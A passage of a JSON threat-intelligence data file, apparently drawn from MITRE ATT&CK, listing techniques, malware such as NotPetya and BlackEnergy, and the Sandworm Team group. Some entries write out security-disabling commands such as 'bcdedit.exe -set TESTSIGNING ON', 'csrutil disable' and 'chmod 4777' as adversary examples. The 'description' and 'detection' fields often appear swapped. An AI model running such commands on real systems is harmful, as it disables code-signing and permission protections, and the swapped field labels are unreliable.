downloaded, this software infected the host computer with a Remote Access Trojan (RAT).",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface",
                    "Input/Output Server",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0802",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Automated Collection",
                "chain_phase": "collection-ics",
                "description": [],
                "detection": "Adversaries may automate collection of industrial environment information using tools or scripts. This automated collection may leverage native control protocols and tools available in the control systems environment. For example, the OPC protocol may be used to enumerate and gather information. Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay",
                    "Control Server"
                ]
            }
        },
        {
            "id": "T0865",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Attachment",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets. Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email. All forms of spearphishing are electronically delivered and target a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution and access.",
                "is_subtype": false,
                "platforms": [
                    "Engineering Workstation",
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian"
                ]
            }
        },
        {
            "id": "T0814",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of Service",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment.\n\nSome ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. \n\nAdversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a  or denial of service condition.\n\nAdversaries may have prior knowledge about industrial protocols or control devices used in the environment through <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Control Device Identification</span></span></span></span>. There are examples of adversaries remotely causing a <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Device Restart/Shutdown</span></span></span></span> by exploiting a vulnerability that induces uncontrolled resource consumption.   \n\nIn the Maroochy attack, the adversary was able to shut an investigator out of the network.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "S0093",
            "type": "tool",
            "attributes": {
                "name": "Backdoor.Oldrea",
                "aliases": [
                    "Havex"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Backdoor.Oldrea is a backdoor used by Dragonfly. It appears to be custom malware authored by the group or specifically for it.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1087.003": "Email Account",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T0888": "Remote System Information Discovery",
                    "T0861": "Point & Tag Identification",
                    "T0863": "User Execution",
                    "T0862": "Supply Chain Compromise",
                    "T0802": "Automated Collection",
                    "T0846": "Remote System Discovery",
                    "T0865": "Spearphishing Attachment",
                    "T0814": "Denial of Service"
                }
            },
            "val": 20
        },
        {
            "id": "G0034",
            "type": "group",
            "attributes": {
                "val": 10,
                "name": "Sandworm Team",
                "aliases": [
                    "ELECTRUM",
                    "Telebots",
                    "IRON VIKING",
                    "BlackEnergy (Group)",
                    "Quedagh",
                    "VOODOO BEAR"
                ],
                "description": "Sandworm Team is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455. This group has been active since at least 2009.\n\nIn October 2020, the US indicted six GRU Unit 74455 officers associated with Sandworm Team for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide NotPetya attack, targeting of the 2017 French presidential campaign, the 2018 Olympic Destroyer attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019. Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as APT28.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0598": "P.A.S. Webshell",
                    "S0401": "Exaramel for Linux",
                    "S0368": "NotPetya",
                    "S0365": "Olympic Destroyer",
                    "S0343": "Exaramel for Windows",
                    "S0231": "Invoke-PSImage",
                    "S0089": "BlackEnergy",
                    "S0555": "CHEMISTGAMES",
                    "S1004": "Industroyer",
                    "S1005": "Killdisk"
                },
                "techniques": {
                    "T1588.006": "Vulnerabilities",
                    "T1598.003": "Spearphishing Link",
                    "T1595.002": "Vulnerability Scanning",
                    "T1594": "Search Victim-Owned Websites",
                    "T1593": "Search Open Websites/Domains",
                    "T1592.002": "Software",
                    "T1591.002": "Business Relationships",
                    "T1590.001": "Domain Properties",
                    "T1589.003": "Employee Names",
                    "T1589.002": "Email Addresses",
                    "T1588.002": "Tool",
                    "T1587.001": "Malware",
                    "T1585.002": "Email Accounts",
                    "T1585.001": "Social Media Accounts",
                    "T1583.004": "Server",
                    "T1583.001": "Domains",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1102.002": "Bidirectional Communication",
                    "T1571": "Non-Standard Port",
                    "T1078.002": "Domain Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.003": "Email Account",
                    "T1087.002": "Domain Account",
                    "T1561.002": "Disk Structure Wipe",
                    "T1491.002": "External Defacement",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1218.011": "Rundll32",
                    "T1505.003": "Web Shell",
                    "T1499": "Endpoint Denial of Service",
                    "T1485": "Data Destruction",
                    "T1219": "Remote Access Software",
                    "T1203": "Exploitation for Client Execution",
                    "T1199": "Trusted Relationship",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1133": "External Remote Services",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System",
                    "T0886": "Remote Services",
                    "T0822": "External Remote Services",
                    "T0859": "Valid Accounts",
                    "T0819": "Exploit Public-Facing Application",
                    "T0823": "Graphical User Interface",
                    "T0857": "System Firmware",
                    "T0803": "Block Command Message",
                    "T0816": "Device Restart/Shutdown",
                    "T0865": "Spearphishing Attachment",
                    "T0804": "Block Reporting Message",
                    "T0855": "Unauthorized Command Message"
                }
            }
        },
        {
            "id": "T1222.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files.",
                "detection": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1213",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Information Repositories",
                "chain_phase": "collection",
                "description": "As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.",
                "detection": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include Sharepoint, Confluence, and enterprise databases such as SQL Server.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "SaaS",
                    "Office 365",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0598",
            "type": "tool",
            "attributes": {
                "name": "P.A.S. Webshell",
                "aliases": [
                    "Fobushell"
                ],
                "labels": [
                    "malware"
                ],
                "description": "P.A.S. Webshell is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.",
                "platforms": [
                    "Linux",
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1087.001": "Local Account",
                    "T1110.001": "Password Guessing",
                    "T1222.002": "Linux and Mac File and Directory Permissions Modification",
                    "T1070.004": "File Deletion",
                    "T1505.003": "Web Shell",
                    "T1518": "Software Discovery",
                    "T1213": "Data from Information Repositories",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1548.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Setuid and Setgid",
                "chain_phase": "privilege-escalation",
                "description": "Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.",
                "detection": "An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. . Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 file</code> or via shorthand naming, <code>chmod u+s file</code>.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future..",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1543",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Create or Modify System Process",
                "chain_phase": "persistence",
                "description": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.",
                "detection": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.  On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. .",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "S0401",
            "type": "tool",
            "attributes": {
                "name": "Exaramel for Linux",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Exaramel for Linux is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under Exaramel for Windows.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.004": "Unix Shell",
                    "T1070.004": "File Deletion",
                    "T1548.001": "Setuid and Setgid",
                    "T1543.002": "Systemd Service",
                    "T1543": "Create or Modify System Process",
                    "T1053.003": "Cron",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 12
        },
        {
            "id": "T0866",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation of Remote Services",
                "chain_phase": "lateral-movement-ics",
                "description": [],
                "detection": "Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. \n\nICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-propagating (“wormable”) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0822",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "External Remote Services",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may leverage external remote services as a point of initial access into your network. These services allow users to connect to internal network resources from external locations. Examples are VPNs, Citrix, and other access mechanisms. Remote service gateways often manage connections and credential authentication for these services. External remote services allow administration of a control system from outside the system. Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network. In some cases, this access is enabled directly from the internet. While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability. The adversary may use these services to gain access to and execute attacks against a control system network. Access to valid accounts is often a requirement. As they look for an entry point into the control system network, adversaries may begin searching for existing point‐to‐point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled. In the Maroochy Attack, the adversary was able to gain remote computer access to the system over radio.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0867",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Lateral Tool Transfer",
                "chain_phase": "lateral-movement-ics",
                "description": [],
                "detection": "Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation.  Copying of files may also be performed laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares. \n\nIn control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian"
                ]
            }
        },
        {
            "id": "S0368",
            "type": "tool",
            "attributes": {
                "name": "NotPetya",
                "aliases": [
                    "ExPetr",
                    "Diskcoder.C",
                    "GoldenEye",
                    "Petrwrap",
                    "Nyetya"
                ],
                "labels": [
                    "malware"
                ],
                "description": "NotPetya is malware that was used by Sandworm Team in a worldwide attack starting on June 27, 2017. While NotPetya appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, NotPetya may be more appropriately thought of as a form of wiper malware. NotPetya contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1078.003": "Local Accounts",
                    "T1569.002": "Service Execution",
                    "T1518.001": "Security Software Discovery",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1529": "System Shutdown/Reboot",
                    "T1486": "Data Encrypted for Impact",
                    "T1210": "Exploitation of Remote Services",
                    "T1083": "File and Directory Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1036": "Masquerading",
                    "T0866": "Exploitation of Remote Services",
                    "T0822": "External Remote Services",
                    "T0828": "Loss of Productivity and Revenue",
                    "T0867": "Lateral Tool Transfer"
                }
            },
            "val": 18
        },
        {
            "id": "S0365",
            "type": "tool",
            "attributes": {
                "name": "Olympic Destroyer",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Olympic Destroyer is malware that was used by Sandworm Team against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. Olympic Destroyer has worm-like features to spread itself across a computer network in order to maximize its destructive impact.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1529": "System Shutdown/Reboot",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1485": "Data Destruction",
                    "T1135": "Network Share Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "S0343",
            "type": "tool",
            "attributes": {
                "name": "Exaramel for Windows",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Exaramel for Windows is a backdoor used for targeting Windows systems. The Linux version is tracked separately under Exaramel for Linux.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1036.004": "Masquerade Task or Service",
                    "T1543.003": "Windows Service",
                    "T1112": "Modify Registry"
                }
            },
            "val": 7
        },
        {
            "id": "S0231",
            "type": "tool",
            "attributes": {
                "name": "Invoke-PSImage",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Invoke-PSImage takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 1
        },
        {
            "id": "T1553.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Code Signing Policy Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.",
                "detection": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1574.010",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Services File Permissions Weakness",
                "chain_phase": "persistence",
                "description": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0859",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Valid Accounts",
                "chain_phase": "persistence-ics",
                "description": [],
                "detection": "Adversaries may steal the credentials of a specific user or service account using credential access techniques. In some cases, default credentials for control system devices may be publicly available. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems. Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network. Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way. Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence. The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) and possibly between the enterprise and operational technology environments. Adversaries may be able to leverage valid credentials from one system to gain access to another system.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface",
                    "Input/Output Server",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "S0089",
            "type": "tool",
            "attributes": {
                "name": "BlackEnergy",
                "aliases": [
                    "Black Energy"
                ],
                "labels": [
                    "malware"
                ],
                "description": "BlackEnergy is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1553.006": "Code Signing Policy Modification",
                    "T1071.001": "Web Protocols",
                    "T1574.010": "Services File Permissions Weakness",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1552.001": "Credentials In Files",
                    "T1548.002": "Bypass User Account Control",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1485": "Data Destruction",
                    "T1120": "Peripheral Device Discovery",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels",
                    "T0869": "Standard Application Layer Protocol",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment"
                }
            },
            "val": 28
        },
        {
            "id": "T1605",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command-Line Interface",
                "chain_phase": "execution",
                "description": "Command-Line Interface execution can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Adversaries may use built-in command-line interfaces to interact with the device and execute commands. Android provides a bash shell that can be interacted with over the Android Debug Bridge (ADB) or programmatically using Java’s `Runtime` package. On iOS, adversaries can interact with the underlying runtime shell if the device has been jailbroken.\n\nIf the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1575",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Native Code",
                "chain_phase": "defense-evasion",
                "description": "This is abuse of standard OS-level APIs and are therefore typically undetectable to the end user.",
                "detection": "Adversaries may use Android’s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.\n\nThe NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.\n\nAdversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1533",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Local System",
                "chain_phase": "collection",
                "description": "Accessing data from the local system can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system.\n\nLocal system data includes information stored by the operating system. Access to local system data often requires escalated privileges (e.g. root access). Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1521",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Cryptographic Protocol",
                "chain_phase": "command-and-control",
                "description": "Since data encryption is a common practice in many legitimate applications and uses standard programming language-specific APIs, encrypting data for command and control communication is undetectable to the user.",
                "detection": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1474",
            "type": "technique",
            "val": null,
            "attributes": {
